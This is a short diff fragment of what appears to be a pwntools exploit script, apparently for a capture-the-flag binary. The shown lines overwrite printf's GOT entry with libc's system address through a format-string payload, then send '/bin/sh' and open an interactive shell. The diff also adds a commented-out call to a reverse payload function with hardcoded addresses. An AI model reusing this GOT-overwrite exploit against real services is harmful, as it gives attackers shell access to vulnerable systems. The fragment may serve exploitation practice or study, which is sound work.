@@ -21,6 +21,7 @@ got_addr = find_got(p,dynamic_ptr)
 printf_got = resolve_got(got_addr, fprintf_libc)
 
 send_payload(p,printf_got, system_libc,6)
+#send_rev_payload(r,0x804a020,0xbffff92c,261)
 p.sendline('/bin/sh\x00')
 p.interactive()
 p.close()
